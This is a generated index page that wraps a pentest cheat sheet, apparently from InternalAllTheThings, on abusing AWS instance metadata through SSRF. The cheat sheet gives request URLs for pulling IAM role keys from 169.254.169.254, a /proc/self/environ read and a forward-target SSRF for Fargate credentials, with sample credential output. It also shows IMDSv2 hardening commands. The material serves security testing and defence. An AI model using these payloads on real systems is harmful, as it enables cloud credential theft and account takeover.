---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# AWS - Metadata SSRF

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-aws-aws-metadata` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-metadata.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [AWS - Metadata SSRF](../../topics/cloud/aws-metadata-ssrf.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-aws-aws-metadata |
| name | AWS - Metadata SSRF |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/aws/aws-metadata.md |

## Preserved Source Material

````yaml
_body: "# AWS - Metadata SSRF\n\n> AWS released additional security defences against the attack.\n\n:warning: Only working\
  \ with IMDSv1.\n\nEnabling IMDSv2\n\n```ps1\naws ec2 modify-instance-metadata-options --instance-id <INSTANCE-ID> --profile\
  \ <AWS_PROFILE> --http-endpoint enabled --http-token required\n```\n\nIn order to use **IMDSv2** you must provide a token.\n\
  \n```powershell\nexport TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"\
  `\ncurl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\"\n```\n\n## Method for Elastic\
  \ Cloud Compute (EC2)\n\nAmazon provides an internal service that allows every EC2 instance to query and retrieve metadata\
  \ about the host. If you discover an SSRF vulnerability running on an EC2 instance, try to fetch the content from 169.254.169.254.\n\
  \n1. Access the IAM : [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)\n\n    ```powershell\n\
  \    ami-id\n    ami-launch-index\n    ami-manifest-path\n    block-device-mapping/\n    events/\n    hostname\n    iam/\n\
  \    identity-credentials/\n    instance-action\n    instance-id\n    ```\n\n2. Find the name of the role assigned to the\
  \ instance : [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n\
  3. Extract the role's temporary keys : [http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM_USER_ROLE_HERE>/](http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM_USER_ROLE_HERE>/)\n\
  \n    ```powershell\n    {\n    \"Code\" : \"Success\",\n    \"LastUpdated\" : \"2019-07-31T23:08:10Z\",\n    \"Type\" :\
  \ \"AWS-HMAC\",\n    \"AccessKeyId\" : \"ASIAREDACTEDXXXXXXXX\",\n    \"SecretAccessKey\" : \"XXXXXXXXXXXXXXXXXXXXXX\",\n\
  \    \"Token\" : \"AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv\",\n    \"Expiration\" : \"2019-08-01T05:20:30Z\"\
  \n    }\n    ```\n\n## Method for Container Service (Fargate)\n\n1. Fetch the **AWS_CONTAINER_CREDENTIALS_RELATIVE_URI**\
  \ variable from `https://awesomeapp.com/download?file=/proc/self/environ`\n\n    ```powershell\n    JAVA_ALPINE_VERSION=8.212.04-r0\n\
  \    HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root\n    AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447\n\
  \    AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2\n    ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd\n\
  \    ```\n\n2. Use the credential URL to dump the AccessKey and SecretKey : `https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447`\n\
  \n    ```powershell\n    {\n        \"RoleArn\": \"arn:aws:iam::953574914659:role/awesome-waf-role\",\n        \"AccessKeyId\"\
  : \"ASIAXXXXXXXXXX\",\n        \"SecretAccessKey\": \"j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt\",\n        \"Token\": \"\
  FQoGZXIvYXdzEMj/////...jHsYXsBQ==\",\n        \"Expiration\": \"2019-09-18T04:05:59Z\"\n    }\n    ```\n\n## AWS API calls\
  \ that return credentials\n\n- [chime:createapikey](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonchime.html)\n\
  - [codepipeline:pollforjobs](https://docs.aws.amazon.com/codepipeline/latest/APIReference/API_PollForJobs.html)\n- [cognito-identity:getopenidtoken](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdToken.html)\n\
  - [cognito-identity:getopenidtokenfordeveloperidentity](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdTokenForDeveloperIdentity.html)\n\
  - [cognito-identity:getcredentialsforidentity](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetCredentialsForIdentity.html)\n\
  - [connect:getfederationtoken](https://docs.aws.amazon.com/connect/latest/APIReference/API_GetFederationToken.html)\n- [connect:getfederationtokens](https://docs.aws.amazon.com/connect/latest/APIReference/API_GetFederationToken.html)\n\
  - [ecr:getauthorizationtoken](https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_GetAuthorizationToken.html)\n\
  - [gamelift:requestuploadcredentials](https://docs.aws.amazon.com/gamelift/latest/apireference/API_RequestUploadCredentials.html)\n\
  - [iam:createaccesskey](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html)\n- [iam:createloginprofile](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateLoginProfile.html)\n\
  - [iam:createservicespecificcredential](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateServiceSpecificCredential.html)\n\
  - [iam:resetservicespecificcredential](https://docs.aws.amazon.com/IAM/latest/APIReference/API_ResetServiceSpecificCredential.html)\n\
  - [iam:updateaccesskey](https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateAccessKey.html)\n- [lightsail:getinstanceaccessdetails](https://docs.aws.amazon.com/lightsail/2016-11-28/api-reference/API_GetInstanceAccessDetails.html)\n\
  - [lightsail:getrelationaldatabasemasteruserpassword](https://docs.aws.amazon.com/lightsail/2016-11-28/api-reference/API_GetRelationalDatabaseMasterUserPassword.html)\n\
  - [rds-db:connect](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html)\n- [redshift:getclustercredentials](https://docs.aws.amazon.com/redshift/latest/APIReference/API_GetClusterCredentials.html)\n\
  - [sso:getrolecredentials](https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_GetRoleCredentials.html)\n\
  - [mediapackage:rotatechannelcredentials](https://docs.aws.amazon.com/mediapackage/latest/apireference/channels-id-credentials.html)\n\
  - [mediapackage:rotateingestendpointcredentials](https://docs.aws.amazon.com/mediapackage/latest/apireference/channels-id-ingest_endpoints-ingest_endpoint_id-credentials.html)\n\
  - [sts:assumerole](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html)\n- [sts:assumerolewithsaml](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-saml.html)\n\
  - [sts:assumerolewithwebidentity](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html)\n\
  - [sts:getfederationtoken](https://docs.aws.amazon.com/cli/latest/reference/sts/get-federation-token.html)\n- [sts:getsessiontoken](https://docs.aws.amazon.com/cli/latest/reference/sts/get-session-token.html)\n\
  \n## References\n\n- [AWS API calls that return credentials - kmcquade](https://gist.github.com/kmcquade/33860a617e651104d243c324ddf7992a)\n\
  - [Cloud security instance metadata - PumaScan - Eric Johnson - 09 Oct 2019](https://pumascan.com/resources/cloud-security-instance-metadata/)\n\
  - [Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019](https://blog.appsecco.com/getting-started-with-version-2-of-aws-ec2-instance-metadata-service-imdsv2-2ad03a1f3650)\n\
  - [Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018](https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6)\n\
  - [Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019](https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed)"
_relative_path: cloud/aws/aws-metadata.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-metadata.md
````
